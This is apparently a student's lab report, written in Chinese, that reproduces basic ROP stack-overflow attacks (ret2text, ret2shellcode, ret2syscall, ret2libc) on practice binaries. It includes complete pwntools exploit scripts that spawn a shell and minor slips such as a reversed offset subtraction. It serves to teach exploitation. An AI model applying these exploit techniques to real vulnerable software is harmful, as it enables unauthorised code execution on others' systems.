# 实验2B：ROP攻击复现

#### 202228013229114 武文浩

## 实验要求完成情况

本次实验中对四种基础的ROP攻击方式（包括ret2text，ret2shellcode，ret2systemcall，ret2libc1，ret2libc2，ret2libc3共六个案例）进行了复现，完成了给定的 ROP 攻击，对实验过程进行了完整的记录，本项目的github链接为：[f-555/ROP: ROP 攻击复现 (github.com)](https://github.com/f-555/ROP)

本次实验的实验环境如下：

- Ubuntu 18.04
  
- IDA pro 7.7
  
- gdb 12.1
  
- pwntools 4.5
  

## 1. 实验原理

栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。通过栈溢出可以使攻击者利用栈向程序中关键的寄存器或代码段写入自定义的内容，从而控制目标程序执行指定的流程。

本次实验中的栈溢出攻击主要的实现方式是对函数调用栈中的关键寄存器进行覆盖，发生函数调用时，函数状态主要涉及三个寄存器 —— esp，ebp，eip。esp 用来存储函数调用栈的栈顶地址，在压栈和退栈时发生变化。ebp 用来存储当前函数状态的基地址，在函数运行时不变，可以用来索引确定函数参数或局部变量的位置。eip 用来存储即将执行的程序指令的地址，cpu 依照 eip 的存储内容读取指令并执行，eip 随之指向相邻的下一条指令，如此反复，程序就得以连续执行指令。

当调用结束时，被调用函数的局部变量会从栈内直接弹出，栈顶会指向被调用函数（callee）的基地址。然后将callee基地址内存储的调用函数（caller）的基地址从栈内弹出，并存到 ebp 寄存器内。这样调用函数（caller）的 ebp（基地址）信息得以恢复。此时栈顶会指向返回地址。而本次实验的关键就是通过栈溢出覆盖掉返回地址，从而完成程序控制权的夺取。

在本次的几个实验中的目标即为通过目标程序打开系统的shell。而本次所涉及到的基本攻击方式根据程序中可利用的信息不同以及控制程序的原理不同，分为如下的四种：

1. ret2text：ret2text 即控制程序执行程序本身已有的的代码 (.text)，这一种攻击方式的实现中往往程序中就有我们需要使用的代码段。
  
2. ret2shellcode：即控制程序执行 shellcode 代码。与ret2text不同的是，shellcode 需要我们自己进行填充，在本次的案例中即需要攻击者自己去填充打开shell的代码。
  
3. ret2syscall：控制程序执行系统调用，获取 shell。
  
4. ret2libc： 这种攻击方式主要是针对 动态链接(Dynamic linking)编译的程序，因为正常情况下是无法在程序中找到像 system() 、execve()这种系统级函数，需要使用 **libc**.**so** 中包含的可以利用的函数来进行攻击
  

## 2. ret2text

根据前文中所属的原理，所以我们只让利用栈溢出覆盖掉程序的返回地址，然后把这一地址改为我们想要的就可以完成攻击，而在ret2text这个案例中，我们想要执行的攻击代码就包含在程序中，因此可以比较轻松的完成。以下将开始进行攻击并获取shell。

首先使用checksec检查目标程序的保护机制，发现程序是 32 位程序，开启了栈不可执行保护，如下图所示。开启了 NX 后，即使有栈溢出漏洞也执行不了写在栈上的 shellcode，但是可通过 ROP 方式来绕过NX跳转至其他地方执行。

![](file:///C:/Users/wwh/AppData/Roaming/marktext/images/2023-04-23-22-09-56-image.png?msec=1682346826801)

使用ida对程序查看程序的源代码如下所示，发现在main函数中调用了一个gets函数，这个函数有栈溢出的漏洞可以被我们利用，因此我们所要做的就是在执行gets的时候将程序覆盖成我们想要的样子。

![](file:///C:/Users/wwh/AppData/Roaming/marktext/images/2023-04-23-22-10-50-image.png?msec=1682346826641)

而另一个重要的函数可以在secure（）中找到，在这一函数中直接调用了一个system（“/bin/sh”），也就是说我们让程序执行这个位置就可以获得shell了，这一部分的代码如下图所示。

![](file://C:\Users\wwh\AppData\Roaming\marktext\images\2023-04-23-22-15-26-image.png?msec=1682346826642)

我们可以找到这一目标位置的地址是0804863A，如下图所示。那么目前我们就有了一个非常明确的实现思路，即使用gets函数的栈溢出漏洞覆盖掉程序的返回地址，让程序返回到084863A。

![](file://C:\Users\wwh\AppData\Roaming\marktext\images\2023-04-23-22-28-24-image.png?msec=1682346826665)

此时我们需要计算应该注入多少数据才能准确的将返回地址覆盖成我们需要的值，即从字符串 s 首地址开始写 ebp – s + 4 个字节到 main() 的返回地址。由于在call _gets 前需要将 s 的地址写入 eax，因此在这一位置下断点，查看eax的值就是s的地址。而ebp的地址也可以直接查看，如下图所示。

![](file://C:\Users\wwh\AppData\Roaming\marktext\images\2023-04-23-23-17-03-image.png?msec=1682346826818)

查看得到结果后计算偏移大小如下所示：

0xffffce2c – 0xffffce98 = 0x6c

此时我们使用如下的代码可以完成目标。

```python
from pwn import *  

sh = process('./ret2text')
addr = 0x804863a

sh.sendline(b'A' * (0x6c + 4) + p32(addr))
sh.interactive()
```

代码执行的效果如下所示：

![](file://C:\Users\wwh\AppData\Roaming\marktext\images\2023-04-23-23-50-43-image.png?msec=1682346826802)

## 3.ret2shellcode

同样按照ret2text相似的思路对目标的程序进行分析，首先使用checksec检测程序开启的保护，如下图所示，源程序几乎没有开启任何保护，并且有可读，可写，可执行段。

![](file://C:\Users\wwh\AppData\Roaming\marktext\images\2023-04-24-10-28-58-image.png?msec=1682346826787)

使用 IDA查看程序的源代码，如下图所示。源代码中包含一个gets（s）函数，存在栈溢出漏洞可以利用，同时存在一个 strncpy 函数，将 payload 写到权限为 rwx 的内存区域 (即 buf2 的地址)。而与上一个案例不同的一点在于没有现成的system函数供我们使用，因此我们需要做的是自己构造相应的代码来执行。这里可以利用buf2来进行操作。

对于这一个案例而言，在栈溢出的基础，需要对应的 shellcode 所在的区域具有可执行权限，也就是说需要关闭NX防护（因此这道题才没有开启NX防护）。

![](file://C:\Users\wwh\AppData\Roaming\marktext\images\2023-04-24-10-30-10-image.png?msec=1682346826643)

在有以上的思路以后我们找到buf2对应的地址，根据主函数中的流程在s里输入shellcode，会被copy到buf2中。因此我们在能够copy到buf2的部分中写入需要执行的代码，然后再利用栈溢出把返回地址改为buf2即可。如下图所示buf2的地址为0x0804A080。

![](file://C:\Users\wwh\AppData\Roaming\marktext\images\2023-04-24-10-57-59-image.png?msec=1682346826665)

按照与上一个实验中相同的方法来确定字符串s首地址与和ebx之间的偏移，计算得到的结果仍然是0x6C。之后使用如下的代码完成目标。

```python
from pwn import *

sh = process('./ret2shellcode')

shellcode = asm(shellcraft.sh())
addr = 0x804a080
pad_len = 0x6c + 4 - len(shellcode)

sh.sendline(shellcode + b'A' * (pad_len) + p32(addr))
sh.interactive()
```

完成的效果如下所示：

![](file://C:\Users\wwh\AppData\Roaming\marktext\images\2023-04-24-11-19-12-image.png?msec=1682346826816)

## 4.ret2syscall

首先使用checksec检测程序开启的保护，如下图所示，源程序开启了栈不可执行保护，如下图所示。这意味着我们没有办法采用与ret2shellcode中一样的手段来完成目标。

![](file://C:\Users\wwh\AppData\Roaming\marktext\images\2023-04-24-11-25-18-image.png?msec=1682346826776)

针对这种情况，实现攻击目标的主要思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，并通告系统调用从而控制程序的执行流程。通过系统调用并使用寄存器为其传递参数可以实现我们需要的程序控制。应用程序调用系统调用的过程如下：

> 把系统调用的编号存入 EAX
> 
> 把系统调用的编号存入 EAX
> 
> 触发 0x80 号中断（int 0x80）

因此如果希望通过系统调用来获取 shell，那么我们就需要把系统调用的参数放入各个寄存器，然后执行 int 0x80 指令通过系统调用执行：execve("/bin/sh",NULL,NULL)。即系统调用号放入eax，三个参数放入ebx、ecx、edx寄存器，其中第一个参数为字符串"/bin/sh"。我们查看程序的源代码，可以发现可以利用的栈溢出漏洞gets。

![](file://C:\Users\wwh\AppData\Roaming\marktext\images\2023-04-24-11-43-09-image.png?msec=1682346826643)

查看源代码可以发现数据中存在/bin/sh，那么系统调用的第一个参数就使用这个字符串的地址，不需要我们构造这个字符串。这一字符串如下所示，地址为0x080BE408。

![](file://C:\Users\wwh\AppData\Roaming\marktext\images\2023-04-24-11-49-42-image.png?msec=1682346826687)

之后我们需要寻找代码片段来实现我们的目标，为了将所需的参数放入指定的寄存器，此时我们需要寻找代码段对eax，ebx，ecx，edx进行操作，我们需要查找形如pop eax；ret；的代码，使用 ROPgadget进行搜索，结果如下图所示：

![](file://C:\Users\wwh\AppData\Roaming\marktext\images\2023-04-24-12-11-32-image.png?msec=1682346826700)

在位置0x080bb196发现了代码段如下所示：

```asm
pop eax；
ret；
```

在位置0x0806eb90发现了代码段如下所示：

```asm
pop edx ;
pop ecx ;
pop ebx ;
ret；
```

通过这两段代码可以实现修改寄存器的值，执行逻辑为先执行代码段1，然后执行代码段2，最后所有的寄存器都修改完成，直接返回到int 0x80，再找一下所需的int 0x80。

![](file://C:\Users\wwh\AppData\Roaming\marktext\images\2023-04-24-12-14-57-image.png?msec=1682346826789)

然后还是像之前的案例一样计算gets中s首地址的偏移，计算结果仍未0x6c，因此我们需要进行的填充以及代码的执行逻辑如下图所示。

![](file:///C:/Users/wwh/Desktop/pic.png?msec=1682346826614)

根据这一流程写出如下的代码，可以实现shell的获取。

```python
from pwn import *

p=process('./rop')

int_0x80=0x8049421
bin_sh_addr=0x80be408
pop_eax_ret=0x80bb196
pop_ebx_ret=0x806eb90

payload= b'A'*(0x6c+4)+p32(pop_eax_ret)+p32(0xb)+p32(pop_ebx_ret)+p32(0)+p32(0)+p32(bin_sh_addr)+p32(int_0x80)
p.sendline(payload)
p.interactive()
```

执行效果如下图所示，顺利获得了shell。

![](file://C:\Users\wwh\AppData\Roaming\marktext\images\2023-04-24-12-22-22-image.png?msec=1682346826689)

## 5.ret2libc

**ret2libc** 针对动态链接编译的程序。因为程序是动态链接生成的，所以在程序运行时会调用程序所有所需的动态链接库（比如libc.so ），libc.so是linux下C语言库中的运行库glibc的动态链接版，并且libc.so中包含了大量的可以利用的函数，如system() 、execve() 等系统级函数，我们可以通过找到这些函数在内存中的地址覆盖掉返回地址来获得当前进程的控制权。在这一部分我们的主要思路如下。

> 1、找到 system() 函数的地址；
> 
>  2、在内存中找到 "/bin/sh" 这个字符串的地址。

再以下的三个案例中将使用这一思路对不用情况下的程序进行实验。

### 5.1 ret2libc1

首先我们仍使用checksec检测程序开启的保护，可以看到这一程序中开启了NX保护。

![](file://C:\Users\wwh\AppData\Roaming\marktext\images\2023-04-24-13-34-16-image.png?msec=1682346826882)

之后我们查看程序的源代码，发现可以利用的栈溢出漏洞gets（s）。那么接下来的操作就是寻找bin/sh的字符串以及system函数了。

![](file://C:\Users\wwh\AppData\Roaming\marktext\images\2023-04-24-13-35-53-image.png?msec=1682346826644)

之后我们利用 ropgadget，我们可以查看是否有 /bin/sh 存在，如下图所示我们可以看到程序中本身存在一个/bin/sh的字符串，其地址为0x09048720。

![](file://C:\Users\wwh\AppData\Roaming\marktext\images\2023-04-24-13-50-54-image.png?msec=1682346826882)

同时可以看到早secure函数中存在一个system调用，如下图所示。但是这个system调用的参数并不是我们想要的，但是由于在上一步中已经有了bin/sh的字符串，我们之后需要做的就是调用system函数的同时把参数改成我们想要的。

![](file://C:\Users\wwh\AppData\Roaming\marktext\images\2023-04-24-13-50-19-image.png?msec=1682346826644)

![](file://C:\Users\wwh\AppData\Roaming\marktext\images\2023-04-24-13-58-42-image.png?msec=1682346826668)

我们可以使用 system 函数的位置覆盖 main() 的返回地址，可以通过构造 system 的栈帧实现传参，system的函数位置为0x08048460，system 函数的参数为 [esp]+4 位置的dword。此时还是使用原来的办法确定偏移的大小为0x6c，之后就可以完成代码的编写，由于system 函数正常调用的时候会有一个对应的返回地址，不过我们并不在意这个，所以使用无意义的字符串进行填充这里以'bbbb' 作为虚假的地址。代码如下所示：

```python
from pwn import *
sh = process('./ret2libc1')

binsh_addr = 0x8048720
system_plt = 0x08048460

payload = b'A' * (0x6c+4) + p32(system_plt) + b'B' * 4 + p32(binsh_addr)
sh.sendline(payload)
sh.interactive()
```

执行的效果如下所示，顺利的拿到了shell。

![](file://C:\Users\wwh\AppData\Roaming\marktext\images\2023-04-24-14-02-19-image.png?msec=1682346826883)

### 5.2 ret2libc2

相比于上一个例子，这一案例中的特别之处在于没有提供/bin/sh这个字符串。首先我们仍使用checksec检测程序开启的保护，可以看到这一程序中开启了NX保护。

![](file://C:\Users\wwh\AppData\Roaming\marktext\images\2023-04-24-14-20-24-image.png?msec=1682346826910)

之后我们查看程序的源代码，发现了可以利用的栈溢出漏洞gets函数。

![](file://C:\Users\wwh\AppData\Roaming\marktext\images\2023-04-24-14-20-47-image.png?msec=1682346826645)

利用 ropgadget，我们可以查看是否有 /bin/sh 存在，这一次可以发现再程序中没有现成的字符串供我们使用。

![](file://C:\Users\wwh\AppData\Roaming\marktext\images\2023-04-24-14-22-00-image.png?msec=1682346826910)

在源代码的secure函数中，存在一个system函数，但是这一函数的参数仍然不是我们想要的，因此我们需要想办法输入所需的参数来替换掉这一函数里面原本的参数。

![](file://C:\Users\wwh\AppData\Roaming\marktext\images\2023-04-24-14-22-31-image.png?msec=1682346826645)

那么需要做的事情就是自己来读取字符串，所以我们需要两个 gadgets，第一个控制程序读取字符串，第二个控制程序执行 system("/bin/sh")。利用 gets 将 '/bin/sh' 写入某个理想位置，然后让 system 函数以该位置为参数，即可执行 shell，而bss字段中恰好有一个buf可以被利用，如下图所示。

![](file://C:\Users\wwh\AppData\Roaming\marktext\images\2023-04-24-14-26-06-image.png?msec=1682346826671)

那么就把字符串写进这个里面，然后像ret2libc1里面一样就行了，这里可以使用gets函数来把需要的字符串写进去，那么我们先去调用gets来把字符串读到buf里，然后再去用这个buf的地址来作为system的参数，偏移的计算方法同上，依然是0x6c。

首先调用gets函数，然后再把gets函数的返回地址改为system函数的返回地址，由于两个函数的参数都是buf2，所以中间不需要其他操作。代码如下所示：

```python
from pwn import *

sh = process('./ret2libc2')

gets_plt = 0x08048460
system_plt = 0x08048490
buf2 = 0x804a080

payload = b'A' * 112 + p32(gets_plt) + p32(system_plt) + p32(buf2) + p32(buf2)
sh.sendline(payload)
sh.sendline('/bin/sh')
sh.interactive()
```

执行的效果如下，顺利地获得了shell。

![](file://C:\Users\wwh\AppData\Roaming\marktext\images\2023-04-24-14-45-17-image.png?msec=1682346826873)

### 5.3 ret2libc3

在这一例子中，不仅没有所需要的字符串，也没有我们需要的system函数。首先我们仍使用checksec检测程序开启的保护，可以看到这一程序中开启了NX保护。

![](file://C:\Users\wwh\AppData\Roaming\marktext\images\2023-04-24-15-17-14-image.png?msec=1682346826873)

利用 ropgadget进行搜索发现程序中自身没有system函数和"/bin/sh"字符串，搜索的结果如下图所示。

![](file://C:\Users\wwh\AppData\Roaming\marktext\images\2023-04-24-15-18-03-image.png?msec=1682346826882)

这是我们需要设法得到一个system函数，而获取的方法就是要找到对应的.so库获取库里面对应的system函数的地址和/bin/sh的地址，这里利用的原理如下所示：

> 1.libc.so 动态链接库中的函数之间相对偏移是固定的。
> 
> 2.即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变。

因此我们可以根据程序中能够获取的几个函数的地址来推断出system函数的地址。查看程序的源代码可以看到栈溢出漏洞gets函数，我们仍然对这个函数进行利用。

![](file://C:\Users\wwh\AppData\Roaming\marktext\images\2023-04-24-15-21-12-image.png?msec=1682346826647)

当程序执行到gets时，程序已经执行过__libc_start_main()函数，其GOT表项已经加载其真实内存地址，将这个地址作为puts()函数的参数输出到程序外部，我们可以得到在本机上这一函数的后12位为0xeb0。之后进行查表，查表使用的网站是[libc database search (blukat.me)](https://libc.blukat.me/?q=__libc_start_main%3Aeb0&l=libc6-i386_2.27-3ubuntu1.5_amd64)。这样就可以得知system函数与str_bin_sh字符串的偏移值，并将其写入程序中。同时将程序返回main处重新执行，利用得到的信息进行后续操作。

![](file://C:\Users\wwh\AppData\Roaming\marktext\images\2023-04-24-18-03-32-image.png?msec=1682346826672)

此时我们已经得知了system函数的地址，这个时候事情就变得简单了，此时的情况与前两个例子中几乎一致。在这里的做法是类似ret2libc2中，发现当前程序中还是有可以利用的buf2（当然直接用str_bin_sh的偏移写也是完全ok的，这里写着玩了一下），使用上一个案例中的代码作为后半部分即可解决。代码如下所示：

```python
from pwn import *

sh = process('ret2libc3')

start_addr = 0x080484D0
put_plt = 0x08048460
libc_main_addr = 0x0804a024
payload = 112 * 'a' + p32(put_plt) + p32(start_addr) + p32(libc_main_addr)
sh.recv()
sh.sendline(payload)

libc_real_addr = u32(sh.recv(4))
print "real_addr is:" + hex(libc_real_addr)
sh.recv()
addr_base = libc_real_addr - 0x018eb0
system_plt = addr_base + 0x03cf10
buf2 = 0x0804A080
gets_plt = 0x08048440

payload = b'A' * 112 + p32(gets_plt) + p32(system_plt) + p32(buf2) + p32(buf2)
sh.sendline(payload)
sh.sendline('/bin/sh')
sh.interactive()
```

执行效果如下图所示，顺利进入shell。

![](file://C:\Users\wwh\AppData\Roaming\marktext\images\2023-04-24-18-07-33-image.png?msec=1682346826702)

## 总结

本次实验中实现了基础的四种攻击方式，并且对于程序执行时的堆栈结构，寄存器作用以及程序执行流程有了更加深刻的认知，主要的参考资料为CTF-wiki（[基本 ROP - CTF Wiki (ctf-wiki.org)](https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#3)）以及课程资料，感谢助教与老师的讲解。
